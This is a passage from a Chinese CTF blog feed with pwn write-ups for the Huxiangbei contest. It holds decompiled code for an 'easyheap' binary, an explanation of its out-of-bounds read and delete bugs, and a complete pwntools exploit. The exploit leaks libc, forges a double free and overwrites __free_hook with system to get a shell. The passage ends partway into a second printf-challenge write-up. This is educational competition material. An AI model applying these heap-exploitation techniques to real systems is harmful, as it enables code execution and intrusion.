bin</code>的size，把它物理高地址的一个<code>tcache</code>给包进来，然后把这个修改之后的大<code>chunk</code>给申请过来就可以了，这样我们就获得了一个一个还在<code>free</code>状态的<code>tcache</code>，然后通过一次次申请chunk，把main_arena放到tcache的fd中，再修改其fd的后四位为<code>_IO_2_1_STDOUT_</code>结构体地址的后四位。</p><p>修改fd成功之后会变成如下状态</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/6.jpg" alt=""></p><p>这个时候我们再<code>add</code>一次<code>0x68</code>的<code>chunk</code>，<code>0x70</code>这条链的tcache就只剩下<code>stdout</code>了，但我们想要申请一个新的<code>chunk</code>，就需要先free掉上一个chunk，如果我们直接free掉我们刚刚申请的那个0x70的chunk，0x70的tcache就又会变成两个，这样只能眼巴巴地看着stdout。</p><p>但如果我们将我们刚刚申请的chunk减小，也就是利用realloc的切割功能，把它从0x70切割成0x50或者别的值，free之后这个chunk就会链到别的大小的tcache中，这时我们再申请chunk就能申请到stdout了。</p><p>修改完stdout之后，我们再申请新chunk之前需要使用功能二，清空buf，否则dele stdout会报错。</p><p>之后就是重复上面的步骤，将chunk分配到<code>free_hook-8</code>,将<code>free_hook-8</code>修改为<code>/bin/sh\x00</code>,将<code>free_hook</code>修改为<code>system</code>，然后free即可。</p><p>再就是由于功能二关闭了标准输出，所以在拿到shell之后我们需要将标准输出重定位到标准输入</p><p>讲的可能有些不清楚，调一遍应该能清楚很多了。</p><h2 id="0x4-easyheap"><a href="#0x4-easyheap" class="headerlink" title="0x4.easyheap"></a>0x4.easyheap</h2><p>保护全开</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp+0h] BYREF</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>增删查改都有</p><p>问题出在show和dele功能</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>show功能存在越界读，可以泄露libc地址和程序加载基地址</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>dele功能存在越界删除</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0x20</span> <span class="token operator">&amp;&amp;</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0xF8</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">safe_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>edit功能中存在一个<code>off-by-null</code>，但实际上没有用，只是迷惑作用</p><p>整体思路如下：我们先通过越界读泄露出libc基地址和程序加载基地址，然后再泄露堆地址，获取一个chunk的地址。然后先free掉一个chunk，然后将这个被free的chunk的地址写到另一个chunk中(其实也不用写，free成链之后chunk中自然就留下了另一个chunk的地址)，如下</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei-pwn-ti-jie/7.jpg" alt=""></p><p>然后，由于我们泄露出了程序加载基地址，我们就能够算出堆地址存储的真实地址，然后用(<code>0x55a36bccf360</code>-堆地址存储的真实地址)/8得到其相应的index，再通过dele功能进行删除，就能够造成<code>double free</code>，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">14</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ec760</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">)</span>pro_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x202008</span>heap_store<span class="token operator">=</span>pro_base<span class="token operator">+</span><span class="token number">0x202040</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'heap_store => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>heap_store<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>heap_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x260</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'heap_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x260</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset<span class="token operator">=</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x260</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">-</span>heap_store<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span>dele<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x5-总结"><a href="#0x5-总结" class="headerlink" title="0x5.总结"></a>0x5.总结</h2><p>还是太菜了，要多的东西还有很多很多啊</p><p>参考文章</p><ul><li><a href="https://www.anquanke.com/post/id/89855" target="_blank" rel="noopener">https://www.anquanke.com/post/id/89855</a></li><li><a href="https://ray-cp.github.io/archivers/%E5%BC%BA%E7%BD%91%E6%9D%AF-pwn-writeup" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/%E5%BC%BA%E7%BD%91%E6%9D%AF-pwn-writeup</a></li><li><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上周末打了打湖湘杯，还是太菜了&lt;/p&gt;
&lt;h2 id=&quot;0x1-pwn1-pwn-printf&quot;&gt;&lt;a href=&quot;#0x1-pwn1-pwn-printf&quot; class=&quot;headerlink&quot; title=&quot;0x1.pwn1-pwn_printf&quot;&gt;&lt;/a&gt;0x1.pw
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯pwn题解</title>
    <link href="https://lawliet.ren/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/"/>
    <id>https://lawliet.ren/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/</id>
    <published>2020-11-02T11:50:15.000Z</published>
    <updated>2020-11-02T14:47:40.630Z</updated>
    
    <content type="html"><![CDATA[<p>上周末打了打湖湘杯，还是太菜了</p><h2 id="0x1-pwn1-pwn-printf"><a href="#0x1-pwn1-pwn-printf" class="headerlink" title="0x1.pwn1-pwn_printf"></a>0x1.pwn1-pwn_printf</h2><p>检查保护</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/1.jpg" alt=""></p><p>IDA分析</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/2.jpg" alt=""></p><p>打开的一瞬间确实有些裂开，不过仔细分析后其实不算难</p><p>程序的初始化完成之后会循环读入16个数值，然后通过sprtinf函数往<code>0x6000000</code>写入各个变量的值</p><pre class=" language-c"><code class="language-c">  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What the f**k printf?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try to input something"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You will find this game very interesting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">0xE000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">+</span> <span class="token number">0xFFFE</span> <span class="token operator">!=</span> format <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>      <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x6000000</span><span class="token punctuation">,</span>      format<span class="token punctuation">,</span>      v13<span class="token punctuation">,</span>      <span class="token number">0LL</span><span class="token punctuation">,</span>      <span class="token operator">&amp;</span>format<span class="token punctuation">,</span>      <span class="token number">0x6000000LL</span><span class="token punctuation">,</span>      <span class="token operator">*</span>v12<span class="token punctuation">,</span>      v12<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v12<span class="token punctuation">,</span>      v11<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v11<span class="token punctuation">,</span>      v10<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v10<span class="token punctuation">,</span>      v9<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v9<span class="token punctuation">,</span>      v8<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v8<span class="token punctuation">,</span>      v7<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v7<span class="token punctuation">,</span>      v6<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v6<span class="token punctuation">,</span>      v5<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span>      v4<span class="token punctuation">,</span>      <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>v16<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v12 <span class="token operator">&lt;=</span> <span class="token number">0x20u</span> <span class="token punctuation">)</span>    <span class="token function">sub_4007C6</span><span class="token punctuation">(</span><span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please try again and you will get it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span 